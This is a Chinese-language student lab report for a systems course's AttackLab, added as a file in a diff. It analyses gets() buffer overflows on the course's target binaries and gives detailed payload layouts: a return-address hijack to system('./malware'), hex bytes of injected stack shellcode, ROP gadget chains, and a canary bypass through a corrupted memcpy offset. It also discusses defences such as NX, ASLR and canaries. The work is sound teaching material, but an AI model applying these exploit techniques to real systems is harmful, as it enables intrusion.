@@ -1,0 +1,139 @@
+计算机系统基础 · Lab 3 AttackLab 实验报告
+
+一、实验目的、依据与验证范围
+本实验研究 x86-64 调用栈、缓冲区溢出、机器码与控制流之间的关系，分别通过复用程序代码、栈上执行、ROP 和间接越界复制完成指定任务，并分析 NX、ASLR 与 Canary 的作用边界。
+报告依据 README.md 中的个人实验记录、四份 payload Python 文件、src 中的参考源码、attack 中实际二进制，以及课程《Lab3: AttackLab》本地文档副本（/tmp/lab3-instructions.html）。提交要求为根目录 PDF；评分输出条件参照 .github/workflows/lab3-checks.yml。
+本文地址、偏移和指令已用实际二进制反汇编核对。原 README 中的运行现象按已有记录引用；当前整理环境为 macOS，目标为 Linux x86-64 ELF，未在本机重新运行目标程序，故不将静态分析或预期输出表述为本次实测通过。
+
+二、观察 input 的栈帧（20 分）
+1. 调用者：main 在 0x401acc 执行 call 0x401977 <input>，下一条指令位于 0x401ad1。
+2. input 的前三条指令为：
+0x401977   push rbp          保存 main 的 rbp，rsp 减少 8
+0x401978   mov rbp, rsp      建立 input 的栈帧基址
+0x40197b   sub rsp, 0x10     分配 16 字节局部缓冲区
+序言执行完后，rbp 是当前栈帧基址，但 [rbp] 中存放的值是调用者 main 的旧 rbp。寄存器本身与该寄存器所指内存的内容应加以区分。
+3. [rbp+8] 保存 0x401ad1，即返回到 main 时应执行的地址。
+4. 该返回地址由 0x401acc 的 call 指令压入栈中，不是由 input 的序言写入。可在 b *0x401acc 后逐条 si，观察 call 执行后 rsp 减少 8，栈顶出现 0x401ad1。
+5. call 保存下一条指令地址并跳转；prologue 保存旧基址并分配局部空间；leave 等价于 mov rsp,rbp 与 pop rbp；ret 将栈顶 8 字节弹入 rip，rsp 增加 8。leave 恢复栈帧状态，ret 完成控制流返回。
+正常返回前可在 b *0x4019d5 停下，依次 si 查看 leave、ret：leave 后 rsp 指向保存返回地址，ret 后 rip=0x401ad1。
+
+栈布局（低地址到高地址，B=rbp-0x10）
+B+0  ～ B+15    expression[16]
+B+16 ～ B+23    main 保存的 rbp
+B+24 ～ B+31    input 返回地址 0x401ad1
+栈分配向低地址增长，但 gets 连续写数组时向高地址前进。
+三、不同长度输入的影响（5 分）
+expression 的容量为 16 字节，只能安全保存最多 15 个字符和末尾的空字符。gets 不接收容量参数，遇换行或 EOF 才结束，并额外写入一个零字节。
+原 README 记录：20 字符测试打印 Executing: echo $((123456789123456))，随后输出 123456789123456；32 字符测试出现 Segmentation fault (core dumped)。原记录未保留完整输入串，因此不能由这段输出反推当时的全部输入。
+20 个字符加末尾零字节共 21 字节，写入 B+0 至 B+20。其中 B+16 至 B+20 覆盖旧 rbp 的低 5 字节，但未触及 B+24 起的返回地址。这解释了本次记录中程序仍能返回并打印结果；它不意味着这种输入安全。eval 将用于算术表达式的长度限制在 15，因此打印的表达式可以短于实际输入。
+32 个字符加末尾零字节共 33 字节，覆盖完整的旧 rbp、完整的返回地址，并在 B+32 处写零。被污染的返回地址可导致 ret 跳往无效地址，引发段错误。不能把该现象简单归因于“写出了数组边界便立即触发硬件异常”：数组边界不等同于内存页权限边界。
+可在 gets 返回后的 0x40199f 设置断点，用 x/40bx $rbp-0x10、x/2gx $rbp 比较两种输入的覆盖范围。
+
+四、利用缓冲区漏洞执行 ./malware（25+5 分）
+实现文件：payload.py；输出长度 32 字节。
+偏移 0～9：b"./malware\x00"，命令 9 字节，加终止零共 10 字节。
+偏移 10～23：14 个 A，填充到返回地址槽。
+偏移 24～31：6b 1a 40 00 00 00 00 00，即 0x401a6b 的小端表示。
+gets 可以从二进制输入中读入零字节；零字节不会终止 gets，却会终止随后 strcpy 的字符串复制。因此完整 payload 写入栈中，同时 command_buf（0x6030d0）仅得到字符串 ./malware。
+input 执行 leave; ret 后转到 eval 内部的 0x401a6b：
+0x401a6b   mov edi, 0x6030d0
+0x401a70   call system@plt
+这跳过算术表达式包装与 Executing 打印，重新设置 system 的参数，而不是依赖之前调用遗留的 rdi。于是执行 system("./malware")，工作目录须为 attack。
+目标输出：You have successfully detonated the bomb! Congratulations!
+该目标是实验给定的本地脚本。当前 payload 覆盖了旧 rbp，并跳过 eval 的序言，后续 eval 的 leave 不能保证正常执行；输出目标消息与进程正常退出是两个不同结论。
+五、main 的机器码与内存布局（5 分）
+以下数据与 README 的 GDB 记录、实际文件反汇编一致：
+指令                         机器码                 地址范围（含端点）
+push rbp                    55                     0x401ac3～0x401ac3
+mov rbp,rsp              48 89 e5              0x401ac4～0x401ac6
+mov eax,0                 b8 00 00 00 00     0x401ac7～0x401acb
+三条指令长度依次为 1、3、5 字节。其内存排列为：
+地址       401ac3  ac4  ac5  ac6  ac7  ac8  ac9  aca  acb  acc
+字节          55      48   89   e5   b8   00   00   00   00   e8
+其中 0x401acc 的 e8 是下一条 call 指令的首字节。指令按字节连续存放，长度并不相同。机器码应按地址递增顺序读取；小端序描述的是多字节数值的存放方式，不是将整条指令倒序。
+可以用 disassemble /r main、x/9bx 0x401ac3 核对指令及其字节；前三条指令分别占据上述三个闭区间。
+
+六、栈空间执行（25+5 分）
+实现文件：payload_dark.py；24 字节指令加 8 字节返回地址，共 32 字节。注入代码为：
+偏移 0：  bf 04 00 00 00       mov edi,4
+偏移 5：  b8 87 1a 40 00       mov eax,0x401a87
+偏移 10：ff d0                      call rax
+偏移 12：bf 00 00 00 00       mov edi,0
+偏移 17：b8 80 18 40 00       mov eax,0x401880
+偏移 22：ff e0                      jmp rax
+偏移 24：d0 0f 80 00 10 72 00 00（返回地址 0x721000800fd0）
+前 24 字节同时覆盖缓冲区与旧 rbp 槽；input 的 ret 跳回缓冲区起点，将原本作为数据读入的字节作为机器码执行。按目标调用约定，第一个整数参数放在 edi 中，写 eax/edi 会清零相应 64 位寄存器高位，所以 rdi=4，rax=grade_eval 的入口。
+grade_eval 位于 0x401a87，grade=4 时打印 Hope A will be your grade! 并刷新输出。随后设置 edi=0，跳转 0x401880 的 exit@plt，意图结束进程。
+地址来源可由二进制验证：init_fixed_stack 在 0x721000000000 映射内存，保护参数为 7（读、写、执行），栈顶为基址+0x801000。__wrap_main 切换 rsp 后 call main。两层 call、两次 push rbp 和 input 的 16 字节局部空间合计 0x30，因此 B=0x721000801000-0x30=0x721000800fd0。
+这依赖实验特设的固定且可执行栈。进入注入代码时 rsp=B+32，call grade_eval 前满足 16 字节对齐。尾部 jmp exit 并非普通 call，其入口对齐不具备普通调用保证；本报告不据静态构造声称已实测正常退出。
+七、ROP（10+10 分）
+实现文件：payload_rop.py；目标 dark-calc-nx；总长 64 字节。
+该程序栈不可执行且位置随机，但代码为非 PIE，因此可以使用固定的代码地址构造返回链。栈仅提供地址与参数，不需要将其中的字节作为指令执行。
+相对 expression 起点的布局：
+0～23       24 个 A，覆盖缓冲区和旧 rbp
+24～31     0x401a33：pop rdi; ret
+32～39     4：待装入 rdi 的参数
+40～47     0x401a34：ret，用于调整栈对齐
+48～55     0x401978：grade_eval
+56～63     0x4016e0：exit@plt
+0x401a32 原指令为 41 5f（pop r15），从第二个字节 0x401a33 开始解码则得到 5f（pop rdi）；下一字节 c3 为 ret。这说明 gadget 可以从既有指令内部开始，不必对应编译器生成的指令边界。
+执行过程：input 返回到 pop rdi；弹出数值 4；ret 取出对齐 gadget 地址；该 gadget 再 ret 到 grade_eval，最终输出 Hope A will be your grade!。
+栈对齐：设 B 为缓冲区首地址，在本程序中 B mod 16=0。第一次 ret 后 rsp=B+32，pop 后为 B+40，随后 ret 后为 B+48，对齐 ret 后为 B+56。因此 grade_eval 入口 rsp mod 16=8，符合普通 call 形成的入口状态。若省略该 ret，则入口对齐错误，内部库函数可能失败。
+grade_eval 返回后转到 exit@plt。不过 rdi 是调用者保存寄存器，grade_eval 内部的 printf、fflush 可改变它；链没有重新设置退出参数，因此不能声称退出码必为 0。exit 入口的对齐也未单独修复。实验评分脚本检查目标输出，并不以目标进程的退出码作为唯一通过条件。
+
+八、ASLR 与 NX 的作用
+栈执行依赖可预测的缓冲区绝对地址及执行权限；NX 阻止在不可执行栈上取指，ASLR 使普通栈地址随运行变化。ROP 利用非 PIE 程序已有的可执行代码及相对栈布局，因而可以避开本实验的这两项限制。这不意味着所有采用 NX 与 ASLR 的程序都可以按相同固定地址攻击。
+文档中的 src/aslr.c 可通过反复运行查看局部变量地址变化。当前报告不编造运行地址；该演示也不能代替目标程序内存布局的分析。GDB 可能默认禁用随机化，比较地址时须确认调试设置。
+九、Canary：通过复制偏移绕过保护（10+10 分）
+实现文件：payload_canary.py；目标 dark-log；总长 260 字节。
+README 将被覆盖变量称为 index，实际源码字段为 f.len；下文统一称 len。令 R 为 input 建帧后的 rbp，由反汇编得：
+expression 起点 R-0x120；logMsg 起点 R-0xa0；len 位于 R-0x20。
+input 的 Canary 在 R-8，旧 rbp 在 R，input 返回地址在 R+8。
+main 序言另分配 16 字节；因此 main 的 rbp=R+0x20，Canary 在 R+0x18，main 返回地址在 R+0x28。
+
+第一阶段：只覆盖参与地址计算的数据。
+payload 前 128 字节为 ROP 链 40 字节和 88 个 A；接着 128 个 B 覆盖 logMsg；最后 c8 00 00 00 把 len 改成 200。gets 额外写的零位于 R-0x1c，而 input Canary 从 R-8 开始，因此此次顺序写入没有触及 Canary。
+第二阶段：借程序自己的复制操作越过 Canary。
+源码逻辑为 memcpy(f.logMsg+f.len, f.expression, 128)，实际二进制将复制展开为多组 8 字节读写。目标首地址为：
+(R-0xa0)+0xc8 = R+0x28 = main 保存返回地址的位置。
+复制范围为 R+0x28 至 R+0xa7，既不触及 input 的 Canary，也不触及 main 的 Canary，而直接改写 main 返回地址及后面的栈内容。因此 input 可以返回 main，main 可执行 puts("Log saved.") 并通过自己的 Canary 检查，最终 ret 进入 ROP 链。
+
+被复制到 main 返回地址处的前 40 字节：
++0x00    0x4018a3：pop rdi; ret
++0x08    4：参数
++0x10    0x4018a4：ret，对齐
++0x18    0x401677：grade_eval
++0x20    0：当前实现未处理的后续返回地址
+同样，0x4018a3 是 41 5f 指令的第二个字节。main 返回地址槽对 16 取模为 8，经过 pop 与两次 ret 后，grade_eval 入口 rsp 对 16 取模为 8。目标输出为 Hope A will be your grade!，之后 grade_eval 返回到地址 0，预期发生异常，不能写成“程序正常结束”。
+
+防御思考
+将 len 放到 expression 的低地址侧，例如结构体中先声明 int len，再声明 expression 与 logMsg，可使从 expression 向高地址连续写入的这条溢出路径无法改写 len，从而阻止本次攻击。该布局调整不能根治越界输入；仍需用有容量限制的读取替代 gets，并校验偏移和复制长度。此处源、目标数组均为 128 字节，若仍复制完整 128 字节，则目标内合法偏移只能为 0；不能只检查 len<128，还要保证非负且 len+复制长度不超过容量。
+十、实现核对、复现方法与结论
+四份 Python 文件使用 sys.stdout.buffer.write 输出原始字节，避免 print 的格式转换和额外换行。多字节返回地址按小端排列。嵌入的零字节不会结束 gets，但会影响 strlen、strcpy 等字符串函数；0x0a 会提前结束 gets，因而 payload 中不能出现中途换行。
+静态核对项目：
+payload.py：32 字节；偏移 24 地址为 0x401a6b。
+payload_dark.py：32 字节；偏移 24 地址为 0x721000800fd0。
+payload_rop.py：64 字节；参数 4 与各 gadget、函数入口一致。
+payload_canary.py：260 字节；偏移 256 的 32 位整数为 0xc8。
+上述长度不包括 gets 自动追加的末尾零字节。
+
+在符合实验要求的 Linux x86-64 环境中，可在 attack 目录执行：
+python3 ../payload.py | ./dark-calc
+python3 ../payload_dark.py | ./dark-calc
+python3 ../payload_rop.py | ./dark-calc-nx
+python3 ../payload_canary.py | ./dark-log
+调试时可先在根目录生成 /tmp/lab3-payload.bin，再在 GDB 中使用 run < /tmp/lab3-payload.bin。采用文件重定向保留二进制零字节，避免用 shell 变量保存 payload。
+
+建议的关键断点与检查项
+栈帧：dark-calc 的 0x401acc、0x40199f、0x4019d5。
+复用代码：dark-calc 的 0x401a6b，查看 command_buf 及 rdi。
+栈执行：0x721000800fd0，单步查看注入指令与 edi。
+ROP：dark-calc-nx 的 0x401a33、0x401978。
+Canary：dark-log 的 0x401719、0x4017df、0x401834。
+在 Canary 复制前后比较 input 的 [rbp-8]，并在仍处于 input 时比较 [rbp+0x18] 和 [rbp+0x28]，即可分别核对 main 的 Canary 未变和返回地址已被改写。
+
+结果与局限
+已有 README 的 20/32 字符输入现象与实际栈布局一致。四项 payload 的地址、长度和关键控制流已通过静态分析核对；当前材料未包含四项完整终端日志或 CI 通过记录，因此本文不将其表述为重新运行后的测试成绩。仓库工作流以 stdout 是否含指定字符串判定攻击任务；该判据允许输出后异常退出，与内存破坏已被妥善处理并不等价。
+
+实验总结
+缓冲区溢出能够同时影响控制数据和参与地址计算的普通数据。复用代码、栈执行与 ROP 展示了不同的控制流转移方式；Canary 任务进一步表明，只保护连续覆盖路径上的哨兵不足以约束程序自身的越界复制。可靠防御需要限制输入长度、验证访问边界，并结合不可执行内存、地址随机化及栈保护等机制。
